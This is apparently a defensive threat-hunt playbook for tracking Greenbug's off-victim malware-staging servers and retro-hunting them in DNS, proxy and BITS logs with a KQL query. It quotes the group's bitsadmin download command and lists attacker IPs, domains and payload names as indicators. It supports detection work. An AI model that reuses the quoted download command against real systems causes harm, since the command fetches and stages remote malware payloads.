# Hunt: Greenbug — off-victim malware-staging infrastructure tracking and retro-hunt

- **Hypothesis:** If Greenbug is staging payloads for an intrusion against us — or has recently — then the act of uploading the malware happens off-victim on adversary-controlled servers we can never see directly, but the *staging infrastructure itself* is discoverable and our logs hold the corroborating retro-hit: any internal host that resolved or connected to a Greenbug staging IP/URL (95.179.177.157 on 445/8081, 185.205.210.46 on 1003/1131, plus C2 domains vsiegru.com, kopilkaorukov.com, winrepp.com, winsecupdater.com, dnslookupdater.com, dnssecupdater.com, apps.vvvnews.com), OR pivoted infrastructure sharing those servers' fingerprints (same ASN/hosting, GRUNTStager/beacon URL path, TLS cert, `/asdfd`-style staging paths, adobe.exe/java.ee/printers.exe payload names). The hunt fuses external infrastructure enumeration with an internal retro-hunt: the external half tells you *what to look for*, the internal half tells you *whether it touched us*.
- **ATT&CK:**
  - T1608.001 — Stage Capabilities: Upload Malware (resource-development) — the core: Greenbug uploads GRUNTStager/Cobalt Strike beacons to its own C2 servers (95.179.177.157, 185.205.210.46) for PowerShell/BITS retrieval; hunt by tracking that off-victim infrastructure and retro-hunting the staging IPs/URLs in our logs.
  - T1105 — Ingress Tool Transfer (command-and-control) — the on-victim consequence of staging: PowerShell `downloadstring` / `bitsadmin /transfer` pulls from those staged URLs; the pull is the internal retro-hit that corroborates the external infra.

- **Actor procedure:** Greenbug pre-positions its second-stage tooling on adversary-owned servers, then reaches back for it during the intrusion. In the telecom campaign the group served Covenant GRUNTStager and Cobalt Strike beacons from 95.179.177.157 (ports 445, 8081) and 185.205.210.46 (ports 1003, 1131), retrieved via PowerShell `net.webclient.downloadstring` and BITS (`bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\a8f4.exe`), dropping payloads under vendor-mimicking names (adobe.exe, java.ee, printers.exe, comms.exe). The upload/staging step (T1608.001) is invisible to victim telemetry — but the staging endpoints, their odd-port HTTP services, their reuse across victims, and the domains (winsecupdater.com, dnslookupdater.com, etc.) are trackable, and any host of ours that fetched from them left a proxy/DNS/BITS trail.

- **Why a hunt, not a rule:** The staging act itself is off-victim resource-development — there is no on-endpoint event to alert on, and by the time a rule could fire, retrieval has already happened. Raw IOC-matching on the known IPs/domains is legitimate but expires the moment Greenbug rotates infrastructure (these are Level-1 indicators). The durable hunt is the *methodology*: enumerate and pivot the staging infrastructure by its stable properties (hosting/ASN clustering, odd-port HTTP staging services, `/asdfd`-style paths, GRUNTStager URL shape, shared TLS certs, updater-themed domain naming), then retro-hunt those pivots across historical DNS/proxy/BITS logs. That fusion — external infra enumeration correlated against internal retro-hits — is analyst judgement, not a standing signature. Confirmed live retrieval from staging infra is an incident, not an alert to tune.

## Data sources required

- External infrastructure intel: passive DNS, certificate transparency, hosting/ASN and Shodan/Censys pivots on the known Greenbug staging IPs/domains; VT/URLScan for shared URL paths and payload names
- Internal DNS resolution logs (retro-hunt for the C2/staging domains and any newly-pivoted ones)
- Web-proxy / firewall / netflow logs: outbound connections to staging IPs and odd ports (445/8081/1003/1131), raw-IP HTTP fetches
- BITS-Client operational log (EID 3/4/59/60) and PowerShell script-block logs (`downloadstring`/`Invoke-WebRequest` to raw-IP:port URLs writing to CSIDL_APPDATA)

## Query starting point

Platform: `KQL / Microsoft Sentinel` — retro-hunt known + pivoted staging infra across DNS, proxy and BITS

```kusto
// Greenbug staging/C2 infrastructure — seed set (extend with passive-DNS/CT pivots)
let stagingIps  = dynamic(["95.179.177.157","185.205.210.46","185.243.115.69","185.243.114.247"]);
let stagingPorts = dynamic([445, 8081, 1003, 1131]);
let stagingDomains = dynamic(["vsiegru.com","kopilkaorukov.com","winrepp.com",
    "winsecupdater.com","dnslookupdater.com","dnssecupdater.com","apps.vvvnews.com"]);
let lookback = 90d;                                   // retro-hunt: staging predates detonation
// (a) DNS resolutions to the staging/C2 domains
let dnsHits = DnsEvents
    | where TimeGenerated > ago(lookback)
    | where Name has_any (stagingDomains)
    | project TimeGenerated, ClientIP, Name, kind="dns";
// (b) Proxy/netflow connections to staging IPs or odd staging ports
let netHits = CommonSecurityLog
    | where TimeGenerated > ago(lookback)
    | where DestinationIP in (stagingIps)
         or (DestinationPort in (stagingPorts) and DestinationIP !startswith "10." and DestinationIP !startswith "192.168.")
    | project TimeGenerated, SourceIP, DestinationIP, DestinationPort,
              RequestURL, kind="net";
// (c) The on-victim retrieval (T1105) that corroborates the staging — BITS/PowerShell to raw IP:port
let pullHits = union
    ( DeviceProcessEvents
      | where TimeGenerated > ago(lookback)
      | where ProcessCommandLine has_any ("downloadstring","Invoke-WebRequest","bitsadmin","/transfer")
      | where ProcessCommandLine matches regex @"https?://\d{1,3}(\.\d{1,3}){3}:\d+"   // raw IP:port URL
      | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, kind="pull" );
union dnsHits, netHits, pullHits
| order by TimeGenerated asc
```

Then pivot outward: take every confirmed staging IP, enumerate its hosting/ASN neighbours, TLS certs and open odd-port HTTP services (Censys/Shodan), and feed newly-discovered IPs/domains back into `stagingIps`/`stagingDomains` for a second retro-hunt pass. That expand-and-re-hunt loop is what survives infrastructure rotation.

## Triage guidance

- **Likely malicious:** any internal host with a DNS resolution or outbound connection to a Greenbug staging IP/domain, especially a **raw-IP HTTP fetch on an odd port (445/8081/1003/1131)**; a **BITS job or PowerShell `downloadstring` pulling from a raw-IP:port URL into CSIDL_APPDATA** and writing a vendor-named binary (adobe.exe, java.ee, printers.exe, a8f4.exe); a host that hit newly-pivoted infra sharing the staging servers' ASN/cert/URL-path fingerprint. Any of these means staged tooling was retrieved onto that host.
- **Likely benign / expected:** the updater-themed domains (winsecupdater / dnslookupdater / dnssecupdater) are *designed* to look like legitimate update services — verify against the real vendor domains, don't assume benign from the name. Legitimate software does fetch over HTTP and occasionally on non-standard ports; a CA-signed, well-aged, high-reputation destination reached by a signed updater is expected. Raw-IP:port fetches into AppData by an unsigned/masqueraded process are not. Stale IOCs may collide with reassigned hosting — confirm the current tenant before flagging on IP alone.
- **Pivot next:** on a confirmed retrieval, pull the full process lineage on the receiving host (what launched the BITS/PowerShell pull — hh.exe/mshta.exe/GRUNTStager.hta?), hunt the dropped payload's execution and any TLS beacon it opens (feeds HUNT-01), and sweep the staging IP/domain across *all* hosts to scope the blast radius. Live retrieval from active Greenbug infra is an intrusion — escalate to incident-response-coordinator and preserve the infra intel for attribution. Where a pivoted staging endpoint is durably confirmed malicious, hand the infra indicators to detection-engineering / TI blocking, but keep the enumeration-and-retro-hunt methodology in the hunt lane.

## References

- https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia
- https://www.netscout.com/blog/asert/greenbugs-dns-isms
- https://attack.mitre.org/techniques/T1608/001/
- https://attack.mitre.org/techniques/T1105/
